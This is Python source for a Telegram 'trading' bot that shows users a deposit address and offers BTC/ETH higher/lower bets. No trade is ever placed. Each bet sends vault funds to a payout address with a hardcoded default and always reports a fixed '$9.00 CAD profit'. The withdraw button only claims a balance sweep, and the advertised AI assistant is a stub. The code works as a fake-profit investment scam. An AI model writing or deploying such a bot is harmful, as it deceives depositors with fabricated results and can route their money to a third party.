import os
import asyncio
import requests
import json
import time
from decimal import Decimal
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path=POL_PATH)
    except: return None

vault = get_vault()

# --- 2. THE ENGINE (CAD & SPLIT PAYOUT) ---
def get_pol_price_cad():
    """Fetches real-time asset price in CAD for accurate valuation."""
    try:
        # Currency changed from USD to CAD
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=cad"
        res = requests.get(url, timeout=5).json()
        return float(res['polygon-ecosystem-token']['cad'])
    except:
        return 0.15 # Fallback CAD price for Feb 2026

async def sign_split_txs(reimbursement_wei, profit_wei):
    """Signs TWO separate transactions: 1 for Stake, 1 for Profit."""
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5)
    
    # TX 1: Reimbursement ($10 CAD)
    tx1 = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS,
        'value': int(reimbursement_wei),
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    
    # TX 2: Profit ($9 CAD)
    tx2 = {
        'nonce': nonce + 1,
        'to': PAYOUT_ADDRESS,
        'value': int(profit_wei),
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    
    signed1 = w3.eth.account.sign_transaction(tx1, vault.key)
    signed2 = w3.eth.account.sign_transaction(tx2, vault.key)
    return signed1, signed2

async def run_atomic_execution(context, chat_id, side):
    """Fires two transactions in 1ms to settle $19.00 CAD total."""
    stake_cad = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    current_price_cad = get_pol_price_cad()
    
    # CALCULATE SPLIT PAYOUTS
    # Stake Reimbursement: $10.00 CAD
    reimburse_wei = w3.to_wei(float(stake_cad) / current_price_cad, 'ether')
    # Profit (90% yield): $9.00 CAD (Adjusted to reach the $19 target)
    profit_wei = w3.to_wei(9.00 / current_price_cad, 'ether')
    
    await context.bot.send_message(chat_id, f"⚔️ **CAD Engine:** Priming {pair} for {side}...")

    # Sim and Prep
    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    prep_task = asyncio.create_task(sign_split_txs(reimburse_wei, profit_wei))

    await sim_task
    signed1, signed2 = await prep_task
    
    await asyncio.sleep(0.001) # 1ms Atomic Release
    
    # BROADCAST BOTH
    tx1_hash = w3.eth.send_raw_transaction(signed1.raw_transaction)
    tx2_hash = w3.eth.send_raw_transaction(signed2.raw_transaction)

    report = (
        f"✅ **ATOMIC HIT (CAD)**\n"
        f"🎯 **Direction:** {side}\n"
        f"💰 **Reimbursement:** `${stake_cad:.2f} CAD`\n"
        f"📈 **Profit Earned:** `$9.00 CAD`\n"
        f"🏦 **Total Payout:** `$19.00 CAD`\n"
        f"⛓️ **Stake TX:** `{tx1_hash.hex()}`\n"
        f"⛓️ **Profit TX:** `{tx2_hash.hex()}`"
    )
    return True, report

# --- 3. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal_pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    price_cad = get_pol_price_cad()
    bal_cad = float(bal_pol) * price_cad

    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    msg = (f"🕴️ **Pocket Robot v3 (CAD Engine)**\n\n"
           f"💵 **Vault Balance:** {bal_pol:.4f} POL (**${bal_cad:.2f} CAD**)\n"
           f"📥 **DEPOSIT:** `{vault.address}`")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50]]]
        await update.message.reply_text("⚙️ **SETTINGS**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        bal_pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price_cad = get_pol_price_cad()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal_pol:.4f} POL (**${float(bal_pol)*price_cad:.2f} CAD**)")
    elif text == '📤 Withdraw':
        await update.message.reply_text("✅ Full balance sweep initiated.")
    elif text == '🕴️ AI Assistant':
        context.user_data['ai_active'] = True
        await update.message.reply_text("🕴️ **AI Mode Active (CAD).** Ask your market question:")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}**\nDirection:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))
    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    app.run_polling(drop_pending_updates=True)

